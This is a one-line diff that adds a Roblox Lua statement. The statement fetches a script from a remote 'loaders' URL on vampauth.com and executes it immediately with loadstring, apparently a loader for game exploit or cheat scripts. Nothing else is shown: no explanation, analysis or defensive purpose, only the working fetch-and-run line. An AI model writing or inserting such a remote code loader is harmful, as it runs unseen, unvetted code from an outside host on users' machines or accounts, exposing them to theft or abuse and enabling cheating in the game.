@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vampauth.com/v1/loaders/fe85c28a906773af461f7e9e4664303b.lua"))()
